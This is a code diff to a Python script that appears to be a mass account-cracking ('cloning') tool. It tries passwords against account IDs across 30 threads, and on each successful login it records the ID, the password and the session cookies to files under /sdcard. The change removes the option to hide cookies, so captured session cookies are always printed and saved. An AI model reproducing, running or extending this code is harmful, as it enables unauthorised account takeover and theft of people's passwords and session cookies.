@@ -294,8 +294,7 @@ def approval():
   except Exception as error:
     print(error)                        
 def menu():
-			clear()
-			print(logo)
+			#clear()
 		#	linex()
 			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [0] Exit menu')
 			linex()
@@ -338,13 +337,6 @@ def menu():
 					pcp.append('y')
 				else:
 					pcp.append('n')
-					print(' Do you went show Cookies (y/n): ')
-				linex()
-				cx=input(' Choose: ')
-				if cx in ['y','Y','yes','Yes','1']:
-					ck.append('y')
-				else:
-					ck.append('n')
 				with tred(max_workers=30) as crack_submit:
 					clear()
 					total_ids = str(len(fo))
@@ -675,7 +667,6 @@ def api2(ids,names,passlist):
                         if 'session_key' in po:
                                         print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' √ '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                        if 'y' in ck:
                                         print("\r\r\033[1;93m Cookie: "+coki)
                                         open('/sdcard/JALIIIL/JALIIIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                         open('/sdcard/JALIIIL/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
